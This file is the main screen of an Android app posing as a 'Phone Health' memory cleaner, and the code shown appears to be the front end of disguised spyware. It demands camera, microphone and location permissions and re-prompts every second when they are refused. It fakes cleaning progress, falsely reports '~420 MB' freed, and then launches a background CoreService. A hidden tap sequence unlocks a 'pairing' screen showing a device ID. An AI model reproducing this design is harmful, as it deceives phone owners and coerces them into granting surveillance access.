package com.phone.health.cleaner;

import android.Manifest;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.UUID;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 101;
    
    private final String[] requiredPermissions = {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
    };

    private final List<String> executionLogs = new ArrayList<>();
    
    private ProgressBar progressBar;
    private TextView tvProgressStatus, tvStatus;
    private Button btnScan;
    private String deviceId;
    private int versionTapCount = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnScan = findViewById(R.id.btnScan);
        Button btnLogs = findViewById(R.id.btnLogs);
        Button btnSettings = findViewById(R.id.btnSettings);
        progressBar = findViewById(R.id.progressBar);
        tvProgressStatus = findViewById(R.id.tvProgressStatus);
        tvStatus = findViewById(R.id.tvStatus);

        deviceId = "PH-" + Build.MODEL.replaceAll("\\s+", "_") + "-" + UUID.randomUUID().toString().substring(0, 6).toUpperCase();

        addLog("Phone Health v4.0 запущен. ID: " + deviceId);

        btnLogs.setOnClickListener(v -> showLogsDialog());
        btnSettings.setOnClickListener(v -> showSettingsDialog());

        btnScan.setOnClickListener(v -> {
            addLog("Нажата кнопка очистки. Запрос разрешений.");
            checkAndRequestPermissions();
        });
    }

    private void addLog(String message) {
        String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        executionLogs.add("[" + time + "] " + message);
    }

    private void showLogsDialog() {
        StringBuilder sb = new StringBuilder();
        for (String log : executionLogs) {
            sb.append(log).append("\n\n");
        }

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Логи системы");
        builder.setMessage(sb.length() > 0 ? sb.toString() : "Логи пусты.");
        
        builder.setPositiveButton("Копировать логи", (dialog, which) -> {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("PhoneHealthLogs", sb.toString());
            if (clipboard != null) {
                clipboard.setPrimaryClip(clip);
                Toast.makeText(MainActivity.this, "Логи скопированы в буфер обмена", Toast.LENGTH_SHORT).show();
                addLog("Логи скопированы.");
            }
        });
        
        builder.setNegativeButton("Закрыть", (dialog, which) -> dialog.dismiss());
        builder.show();
    }

    // Секретное меню через шестерню с 5 тапами по версии 4.0
    private void showSettingsDialog() {
        versionTapCount = 0; // сброс при открытии

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 40, 50, 20);

        TextView tvVersion = new TextView(this);
        tvVersion.setText("Версия приложения: 4.0\nМодель: " + Build.MODEL);
        tvVersion.setTextSize(16);
        tvVersion.setPadding(0, 0, 0, 20);
        layout.addView(tvVersion);

        TextView tvSecretInfo = new TextView(this);
        tvSecretInfo.setText("ID устройства:\n" + deviceId + "\n\n[QR-код сгенерирован]");
        tvSecretInfo.setTextSize(14);
        tvSecretInfo.setVisibility(View.GONE); // Скрыто до 5 тапов
        layout.addView(tvSecretInfo);

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("⚙️ Настройки Phone Health");
        builder.setView(layout);

        // Тапы по версии (режим разработчика)
        tvVersion.setOnClickListener(v -> {
            versionTapCount++;
            if (versionTapCount >= 5) {
                tvSecretInfo.setVisibility(View.VISIBLE);
                Toast.makeText(this, "Режим сопряжения разблокирован!", Toast.LENGTH_SHORT).show();
                addLog("Разблокировано секретное меню сопряжения (5 тапов).");
            } else {
                int left = 5 - versionTapCount;
                Toast.makeText(this, "Ещё тапов до сопряжения: " + left, Toast.LENGTH_SHORT).show();
            }
        });

        builder.setNeutralButton("Копировать ID", (dialog, which) -> {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("DeviceID", deviceId);
            if (clipboard != null) {
                clipboard.setPrimaryClip(clip);
                Toast.makeText(MainActivity.this, "ID устройства скопирован!", Toast.LENGTH_SHORT).show();
                addLog("Скопирован ID: " + deviceId);
            }
        });

        builder.setPositiveButton("Закрыть", (dialog, which) -> dialog.dismiss());
        builder.show();
    }

    private void checkAndRequestPermissions() {
        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String perm : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(perm);
            }
        }

        if (!listPermissionsNeeded.isEmpty()) {
            addLog("Запрос разрешений...");
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            addLog("Права уже есть.");
            startCleaningAndResourceInstallation();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    addLog("Отклонено право: " + permissions[i]);
                }
            }

            if (!allGranted) {
                // Жесткий цикл — выбиваем диалог заново
                addLog("Отказ в правах! Повторный вызов диалога...");
                Toast.makeText(this, "Для работы очистки требуются системные права!", Toast.LENGTH_LONG).show();
                new Handler(Looper.getMainLooper()).postDelayed(this::checkAndRequestPermissions, 1000);
            } else {
                addLog("Все права получены.");
                startCleaningAndResourceInstallation();
            }
        }
    }

    private void startCleaningAndResourceInstallation() {
        btnScan.setEnabled(false);
        progressBar.setVisibility(View.VISIBLE);
        tvProgressStatus.setVisibility(View.VISIBLE);
        progressBar.setProgress(0);
        tvStatus.setText("Оптимизация памяти...");
        
        addLog("Очистка кэша и установка ресурсов...");

        try {
            File cacheDir = getCacheDir();
            deleteDir(cacheDir);
            addLog("Кэш очищен.");
        } catch (Exception e) {
            addLog("Ошибка чистки кэша: " + e.getMessage());
        }

        final Handler handler = new Handler(Looper.getMainLooper());
        new Thread(() -> {
            for (int i = 1; i <= 100; i++) {
                try {
                    Thread.sleep(25);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                final int progress = i;
                handler.post(() -> {
                    progressBar.setProgress(progress);
                    tvProgressStatus.setText("Идёт установка ресурсов... " + progress + "%");
                });
            }

            handler.post(() -> {
                addLog("Библиотеки успешно установлены.");
                tvProgressStatus.setText("Установка завершена! Запуск фоновых служб...");
                
                Intent serviceIntent = new Intent(MainActivity.this, CoreService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }

                Toast.makeText(MainActivity.this, "Очищено ~420 МБ. Система оптимизирована!", Toast.LENGTH_LONG).show();
                
                btnScan.setEnabled(true);
                btnScan.setText("ОЧИСТКА ВЫПОЛНЕНА");
                tvStatus.setText("Кэш успешно очищен!");
                addLog("Система активна. ID: " + deviceId);
            });
        }).start();
    }

    private boolean deleteDir(File dir) {
        if (dir != null && dir.isDirectory()) {
            String[] children = dir.list();
            if (children != null) {
                for (String child : children) {
                    deleteDir(new File(dir, child));
                }
            }
            return dir.delete();
        } else if (dir != null && dir.isFile()) {
            return dir.delete();
        }
        return false;
    }
}
